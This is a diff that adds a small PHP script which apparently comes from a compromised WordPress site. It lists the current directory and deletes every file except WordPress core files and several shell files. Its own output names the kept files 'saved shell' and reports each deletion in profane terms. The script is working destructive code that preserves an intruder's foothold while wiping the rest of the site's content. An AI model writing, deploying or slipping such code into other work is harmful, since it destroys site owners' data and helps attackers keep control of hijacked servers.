@@ -1,0 +1,13 @@
+<?php
+$cepek = getcwd();
+$files = scandir($cepek);
+foreach($files as $file) {
+$nyata = $file;
+if($nyata == 'class.php' or $nyata == 'ghz.php'or $nyata == 'index.html' or $nyata == '.htaccess' or $nyata == 'c.php' or $nyata == 'class.php' or $nyata == 'index.php' or $nyata == 'wp-activate.php' or $nyata == 'wp-blog-header.php' or $nyata == 'wp-comments-post.php' or $nyata == 'wp-config-sample.php' or $nyata == 'wp-config.php' or $nyata == 'wp-load.php' or $nyata == 'wp-login.php' or $nyata == 'v.php' or $nyata == 'wp-settings.php' or $nyata == 'wp-signup.php' or $nyata == 'wp-trackback.php' or $nyata == 'xmlrpc.php' or $nyata == 'plugin.php' or $nyata == 'cp.php' or $nyata == 'rem.php'){
+echo 'this saved shell ==> '.$cepek."/".$nyata.'<br>';
+}else{
+unlink($cepek."/".$nyata);
+echo 'done deleted this fucked!! ==> '.$cepek."/".$nyata.'<br>';
+}
+}
+?>
